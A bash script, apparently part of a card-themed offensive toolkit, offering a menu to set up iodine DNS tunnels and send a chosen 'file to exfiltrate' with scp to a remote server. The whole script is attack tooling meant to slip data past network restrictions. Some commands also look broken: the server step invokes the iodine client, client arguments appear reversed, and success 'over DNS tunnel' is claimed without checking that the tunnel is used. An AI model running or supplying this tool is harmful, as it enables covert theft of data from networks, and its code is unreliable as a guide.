#!/bin/bash

CYAN='\033[1;36m'
RESET='\033[0m'

# Menu for the Two of Diamonds Card
two_of_diamonds_menu() {
    clear
    echo -e "${CYAN}"
    echo "      __________________________________________________________________________"
    echo "     |                              Two of Diamonds                             |"
    echo "     |                     Exfiltrate Data Over DNS                             |"
    echo "     |__________________________________________________________________________|"
    echo "     |                                                                          |"
    echo "     |  This card provides an interface to utilize DNS tunneling for covert     |"
    echo "     |  data exfiltration. It leverages tools like iodine to bypass network     |"
    echo "     |  restrictions and send data over DNS queries.                            |"
    echo "     |                                                                          |"
    echo "     |                                                                          |"
    echo "     |  1. Set Up DNS Tunneling Server                                          |"
    echo "     |  2. Set Up DNS Tunneling Client                                          |"
    echo "     |  3. Send Data Over DNS Tunnel                                            |"
    echo "     |  4. Exit                                                                 |"
    echo "     |__________________________________________________________________________|"
    echo -e "${RESET}"
    read -p "Enter your choice: " choice
    case $choice in
        1) setup_dns_server ;;
        2) setup_dns_client ;;
        3) send_data_dns ;;
        4) exit 0 ;;
        *) echo "Invalid choice. Try again."; sleep 1; two_of_diamonds_menu ;;
    esac
}

# Set up DNS tunneling server
setup_dns_server() {
    clear
    echo -e "${CYAN}Setting Up DNS Tunneling Server...${RESET}"
    if command -v iodine &>/dev/null; then
        read -p "Enter the domain name for tunneling (e.g., example.com): " domain
        read -p "Enter the IP address for the DNS server: " server_ip
        echo -e "${CYAN}Starting iodine server with domain: $domain and IP: $server_ip${RESET}"
        iodine -f "$server_ip" "$domain"
    else
        echo -e "${CYAN}Error: iodine is not installed.${RESET}"
        echo "Please install iodine using your package manager."
    fi
    read -n 1 -s -r -p "Press any key to return to the menu..."
    two_of_diamonds_menu
}

# Set up DNS tunneling client
setup_dns_client() {
    clear
    echo -e "${CYAN}Setting Up DNS Tunneling Client...${RESET}"
    if command -v iodine &>/dev/null; then
        read -p "Enter the domain name for tunneling (e.g., example.com): " domain
        read -p "Enter the IP address of the DNS server: " server_ip
        echo -e "${CYAN}Starting iodine client with domain: $domain and server IP: $server_ip${RESET}"
        iodine -f "$domain" "$server_ip"
    else
        echo -e "${CYAN}Error: iodine is not installed.${RESET}"
        echo "Please install iodine using your package manager."
    fi
    read -n 1 -s -r -p "Press any key to return to the menu..."
    two_of_diamonds_menu
}

# Send data over DNS tunnel
send_data_dns() {
    clear
    echo -e "${CYAN}Sending Data Over DNS Tunnel...${RESET}"
    if command -v scp &>/dev/null; then
        read -p "Enter the file to exfiltrate: " file
        read -p "Enter the DNS server IP: " server_ip
        scp "$file" "$server_ip:/tmp/"
        if [[ $? -eq 0 ]]; then
            echo -e "${CYAN}File $file successfully sent over DNS tunnel.${RESET}"
        else
            echo -e "${CYAN}Error: Failed to send file.${RESET}"
        fi
    else
        echo -e "${CYAN}Error: SCP is not installed.${RESET}"
        echo "Please install SCP using your package manager."
    fi
    read -n 1 -s -r -p "Press any key to return to the menu..."
    two_of_diamonds_menu
}

two_of_diamonds_menu
